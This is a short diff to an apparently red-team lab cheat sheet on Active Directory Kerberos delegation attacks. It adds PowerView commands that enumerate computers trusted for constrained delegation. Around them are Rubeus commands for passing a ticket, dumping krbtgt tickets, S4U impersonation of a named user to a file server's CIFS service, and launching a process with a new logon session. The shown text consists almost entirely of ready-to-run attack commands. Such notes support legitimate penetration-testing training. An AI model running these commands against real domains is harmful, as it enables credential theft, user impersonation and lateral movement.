@@ -36,6 +36,8 @@ execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x686cf9 /ticket:
 ### Constrained Delegation
 ```
 powershell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
+powershell Get-DomainComputer web-2.cyberbotic.io | select -exp msds-AllowedToDelegateTo 
+powershell Get-DomainComputer -TrustedToAuth | select -exp dnshostname 
 Rubeus dump /service:krbtgt
 Rubeus s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.cyberbotic.io /ticket:[...snip...]
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
